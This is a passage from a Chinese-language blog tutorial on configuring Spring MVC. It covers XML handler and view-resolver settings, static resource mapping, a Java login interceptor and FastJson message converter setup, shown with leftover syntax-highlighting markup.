class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span><span class="token punctuation">></span></span>            //demo为访问地址，hello为映射bean地址            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo<span class="token punctuation">"</span></span> <span class="token attr-name">value-ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hello<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entry</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h4 id="2-通过注解方式配置"><a href="#2-通过注解方式配置" class="headerlink" title="2.通过注解方式配置"></a>2.通过注解方式配置</h4><p>注解处理适配器</p><p>spring3.1之前使用</p><p>org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter</p><p>spring3.1之后使用</p><p>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>spring-mvc.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>mvc</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/mvc<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans    http://www.springframework.org/schema/beans/spring-beans.xsd    http://www.springframework.org/schema/context    http://www.springframework.org/schema/context/spring-context.xsd    http://www.springframework.org/schema/mvc    http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 配置SpringMVC --></span>    <span class="token comment" spellcheck="true">&lt;!-- 1.开启SpringMVC注解模式 --></span>    <span class="token comment" spellcheck="true">&lt;!-- 简化配置：        (1)自动注册DefaultAnootationHandlerMapping,AnotationMethodHandlerAdapter        (2)提供一些列（默认加载）：数据绑定，数字和日期的format @NumberFormat, @DateTimeFormat, xml,json默认读写支持        (3)使用此标签不用配置上面的处理映射器和处理适配器（省略不写）    --></span>    <span class="token comment" spellcheck="true">&lt;!--注解方式--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>annotation-driven</span> <span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 2.静态资源默认servlet配置        (1)加入对静态资源的处理：js,gif,png        (2)允许使用"/"做整体映射     --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>default-servlet-handler</span><span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 3.配置jsp 显示ViewResolver --></span>    <span class="token comment" spellcheck="true">&lt;!--视图解析器--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.InternalResourceViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.JstlView<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/WEB-INF/jsp/<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>.jsp<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipartResolver<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.multipart.commons.CommonsMultipartResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>maxUploadSize<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1048576<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--可以单独配置单个handler（controller）--></span>    <span class="token comment" spellcheck="true">&lt;!-- &lt;bean id = "hello" class="com.kuang.controller.HelloController"/> --></span>    <span class="token comment" spellcheck="true">&lt;!-- 4.扫描web相关的bean --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.controller<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>此外还可以添加一些xml标签，参考 <a href="https://www.cnblogs.com/jimloveq/p/10609465.html" target="_blank" rel="noopener">Jim~Liang</a> 的博客</p><pre class=" language-xml"><code class="language-xml">设置静态资源不拦截第一种是采用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>default-servlet-handler</span> <span class="token punctuation">/></span></span>，（一般Web应用服务器默认的Servlet名称是"default"，所以这里我们激活Tomcat的defaultServlet来处理静态文件，在web.xml里配置如下代码即可：）<span class="token comment" spellcheck="true">&lt;!--　该servlet为tomcat,jetty等容器提供,将静态资源映射从/改为/static/目录，如原来访问　http://localhost/foo.css　,现在http://localhost/static/foo.css　--></span>  <span class="token comment" spellcheck="true">&lt;!-- 不拦截静态文件 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/js/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/css/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/images/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/fonts/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  第二种是采用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token punctuation">/></span></span>，资源路径，在springmvc的配置文件中加入以下代码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/**<span class="token punctuation">"</span></span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static_resources/javascript/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/styles/**<span class="token punctuation">"</span></span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static_resources/css/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/images/**<span class="token punctuation">"</span></span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static_resources/images/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  </code></pre><p>自定义拦截器</p><pre class=" language-xml"><code class="language-xml">SpringMVC的拦截器HandlerInterceptorAdapter对应提供了三个preHandle，postHandle，afterCompletion方法。preHandle在业务处理器处理请求之前被调用，postHandle在业务处理器处理请求执行完成后,生成视图之前执行，afterCompletion在DispatcherServlet完全处理完请求后被调用,可用于清理资源等 。所以要想实现自己的权限管理逻辑，需要继承HandlerInterceptorAdapter并重写其三个方法。首先在springmvc.xml中加入自己定义的拦截器我的实现逻辑CommonInterceptor，<span class="token comment" spellcheck="true">&lt;!--配置拦截器, 多个拦截器,顺序执行 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>interceptors</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>interceptor</span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 匹配的是url路径， 如果不配置或/**,将拦截所有的Controller --></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/user/**<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/test/**<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.alibaba.interceptor.CommonInterceptor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>interceptor</span><span class="token punctuation">></span></span>      <span class="token comment" spellcheck="true">&lt;!-- 当设置多个拦截器时，先按顺序调用preHandle方法，然后逆序调用每个拦截器的postHandle和afterCompletion方法 --></span>     <span class="token comment" spellcheck="true">&lt;!--也可以直接这样写就可以不拦截静态资源--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>interceptor</span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- Login interceptor --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/**<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/login<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/**<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/jq/**<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/css/**<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/images/**<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.csl.mmscm.handler.LoginInterceptor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>interceptor</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>interceptors</span><span class="token punctuation">></span></span>  </code></pre><p>CommonInterceptor .java（拦截登录）</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span>  <span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span>  <span class="token keyword">import</span> org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>Logger<span class="token punctuation">;</span>  <span class="token keyword">import</span> org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>LoggerFactory<span class="token punctuation">;</span>  <span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ModelAndView<span class="token punctuation">;</span>  <span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span>HandlerInterceptorAdapter<span class="token punctuation">;</span>  <span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>util<span class="token punctuation">.</span>RequestUtil<span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">HandlerInterceptorAdapter</span><span class="token punctuation">{</span>      <span class="token keyword">private</span> <span class="token keyword">final</span> Logger log <span class="token operator">=</span> LoggerFactory<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>CommonInterceptor<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LAST_PAGE <span class="token operator">=</span> <span class="token string">"com.alibaba.lastPage"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/*      * 利用正则映射到需要拦截的路径         private String mappingURL;     public void setMappingURL(String mappingURL) {                    this.mappingURL = mappingURL;         }      */</span>      <span class="token comment" spellcheck="true">/**       * 在业务处理器处理请求之前被调用       * 如果返回false       *     从当前的拦截器往回执行所有拦截器的afterCompletion(),再退出拦截器链      * 如果返回true       *    执行下一个拦截器,直到所有的拦截器都执行完毕       *    再执行被拦截的Controller       *    然后进入拦截器链,       *    从最后一个拦截器往回执行所有的postHandle()       *    接着再从最后一个拦截器往回执行所有的afterCompletion()       */</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span>                HttpServletResponse response<span class="token punctuation">,</span> Object handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              RequestUtil<span class="token punctuation">.</span><span class="token function">saveRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"==============执行顺序: 1、preHandle================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String requestUri <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          String contextPath <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          String url <span class="token operator">=</span> requestUri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>contextPath<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"requestUri:"</span><span class="token operator">+</span>requestUri<span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"contextPath:"</span><span class="token operator">+</span>contextPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"url:"</span><span class="token operator">+</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            String username <span class="token operator">=</span>  <span class="token punctuation">(</span>String<span class="token punctuation">)</span>request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>              log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Interceptor：跳转到login页面！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/WEB-INF/jsp/login.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token keyword">else</span>              <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/**      * 在业务处理器处理请求执行完成后,生成视图之前执行的动作         * 可在modelAndView中加入数据，比如当前时间      */</span>      <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span>                HttpServletResponse response<span class="token punctuation">,</span> Object handler<span class="token punctuation">,</span>                ModelAndView modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>             log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"==============执行顺序: 2、postHandle================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modelAndView <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//加入当前时间    </span>            modelAndView<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span><span class="token string">"var"</span><span class="token punctuation">,</span> <span class="token string">"测试postHandle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/**       * 在DispatcherServlet完全处理完请求后被调用,可用于清理资源等        *        * 当有拦截器抛出异常时,会从当前拦截器往回执行所有的拦截器的afterCompletion()       */</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span>                HttpServletResponse response<span class="token punctuation">,</span> Object handler<span class="token punctuation">,</span> Exception ex<span class="token punctuation">)</span>                <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"==============执行顺序: 3、afterCompletion================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    </code></pre><p>3.springmvc整合FastJson（fastJson可以将传输过来的数据直接转换成对象）</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>annotation-driven</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>message-converters</span> <span class="token attr-name">register-defaults</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>supportedMediaTypes<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>text/html;charset=UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>application/json;charset=UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>features<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>WriteMapNullValue<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>QuoteFieldNames<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>WriteDateUseDateFormat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                        <span class="token comment" spellcheck="true">&lt;!-- 禁用fastjson循环引用检测 --></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>DisableCircularReferenceDetect<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>message-converters</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>annotation-driven</span><span class="token punctuation">></span></span></code></pre><h3 id="五、定义多个视图解析器"><a href="#五、定义多个视图解析器" class="headerlink" title="五、定义多个视图解析器"></a>五、定义多个视图解析器</h3><pre class=" language-xml"><code class="language-xml"> <span class="token comment" spellcheck="true">&lt;!-- Velocity视图解析器    默认视图  --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>velocityViewResolver<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.velocity.VelocityViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>contentType<span class="token 